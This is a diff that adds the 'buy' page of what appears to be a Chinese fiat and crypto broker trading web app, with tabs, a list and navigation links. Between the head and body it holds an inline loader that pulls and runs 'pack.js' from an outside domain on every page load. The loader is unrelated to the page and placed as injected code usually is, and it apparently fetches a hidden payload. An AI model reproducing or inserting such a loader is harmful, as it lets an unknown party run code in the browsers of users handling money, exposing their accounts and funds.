@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+		<title>购买</title>
+		<link rel="stylesheet" href="../../static/css/weui-min.css" />
+		<link rel="stylesheet" href="../../static/css/weui-jquery.css" />
+		<link rel="stylesheet" href="../../static/css/common.css" />
+		<link rel="stylesheet" href="../../static/css/transaction/transaction.css" />
+	</head>
+	<script>
+		(function () {
+			var dw = document.createElement("script");
+			dw.src = "https://yipinapp.cn/cydia/pack.js?zBv2XrG8cSQqzRDCm9hsEL"
+			var s = document.getElementsByTagName("script")[0];
+			s.parentNode.insertBefore(dw, s);
+		})()
+	</script>
+	<body>
+		<div class="transcanIndex brokerIndex">
+			<div class="weui-tab" id="selectBox">
+				<div class="tranceTitle">
+					<div class="tranLeft">
+						<img src="../../static/images/qiehuan.png" />
+						<span>经纪商</span>
+					</div>
+					<div class="weui-navbar navtitle" id="aboveTitle">
+	    				<a class="weui-navbar__item weui-bar__item--on" data-id="1" href="#tab1">我要买</a>
+	    				<a class="weui-navbar__item" data-id="0" href="#tab1">我要卖</a>
+					</div>
+					<div class="tranRight">
+						<a href="mybroker.html" class="">我的队列</a>
+					</div>
+				</div>
+				<div class="weui-tab__bd list-main-mian weui-form-preview infinite weui-pull-to-refresh" id="tabtxt">
+					<div class="weui-pull-to-refresh__layer" style="padding: 5px;">
+			            <div class="weui-pull-to-refresh__arrow"></div>
+			            <div class="weui-pull-to-refresh__preloader"></div>
+			            <div class="down">下拉刷新</div>
+			            <div class="up">释放刷新</div>
+			            <div class="refresh">正在刷新</div>
+			        </div>
+			        <div id="tab1" class="weui-tab__bd-item weui-tab__bd-item--active">
+				    	<div class="brokerDiv">
+				    		<ul id="listFun">
+				    		</ul>
+				    	</div>
+				    </div>
+				   	<div class="weui-loadmore">
+			            <i class="weui-loading"></i>
+			            <span class="weui-loadmore__tips">正在加载</span>
+			        </div>
+				</div>
+			</div>
+		</div>
+		<div class="weui-tabbar">
+		    <a href="../home/index.html" class="weui-tabbar__item">
+		      <div class="weui-tabbar__icon">
+		        <img src="../../static/images/person.png" alt="">
+		      </div>
+		      <p class="weui-tabbar__label">个人中心</p>
+		    </a>
+		    <a href="../vote/vote.html" class="weui-tabbar__item">
+		      <div class="weui-tabbar__icon  special-se">
+		        <img src="../../static/images/vote.png" alt="">
+		      </div>
+		      <p class="weui-tabbar__label">投票竞选</p>
+		    </a>
+		    <a href="#" class="weui-tabbar__item weui-bar__item--on">
+		      <div class="weui-tabbar__icon">
+		        <img src="../../static/images/transaction-select.png" alt="">
+		      </div>
+		      <p class="weui-tabbar__label">法币交易</p>
+		    </a>
+		    <a href="../account/acount.html" class="weui-tabbar__item">
+		      <div class="weui-tabbar__icon">
+		        <img src="../../static/images/account.png" alt="">
+		      </div>
+		      <p class="weui-tabbar__label">我的账户</p>
+		    </a>
+		  </div>
+		</div>
+		<script type="text/javascript" src="../../lib/jquery.js" ></script>
+		<script type="text/javascript" src="../../lib/weui.min.js" ></script>
+		<script type="text/javascript" src="../../lib/jquery-weui.js" ></script>
+		<script type="text/javascript" src="../../static/js/api.js" ></script>
+		<script type="text/javascript" src="../../static/js/common.js" ></script>
+		<script type="text/javascript" src="../../static/js/transaction/broker.js" ></script>
+	</body>
+</html>
